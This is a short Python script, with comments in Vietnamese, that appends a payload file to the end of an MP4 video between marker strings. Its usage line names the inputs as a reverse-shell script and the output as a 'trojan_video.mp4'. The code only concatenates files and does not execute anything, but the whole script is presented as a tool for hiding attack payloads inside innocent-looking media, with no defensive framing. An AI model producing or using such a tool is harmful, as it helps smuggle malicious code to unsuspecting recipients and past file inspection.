import sys

def inject_payload(mp4_file, payload_file, out_file):
    # Copy video trước, sau đó nối payload vào cuối
    with open(mp4_file, "rb") as vf, open(payload_file, "rb") as pf, open(out_file, "wb") as outf:
        data = vf.read()
        outf.write(data)
        # Đặt một signature marker đặc biệt ("---PAYLOAD---" + độ dài) để dễ nhận biết khi extract
        outf.write(b"\n---PAYLOAD-START---\n")
        payload = pf.read()
        outf.write(payload)
        outf.write(b"\n---PAYLOAD-END---\n")
    print(f"[+] Đã nhúng payload vào {out_file}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 payload_injector.py demo.mp4 reverse_shell.sh trojan_video.mp4")
        sys.exit(1)
    inject_payload(sys.argv[1], sys.argv[2], sys.argv[3])
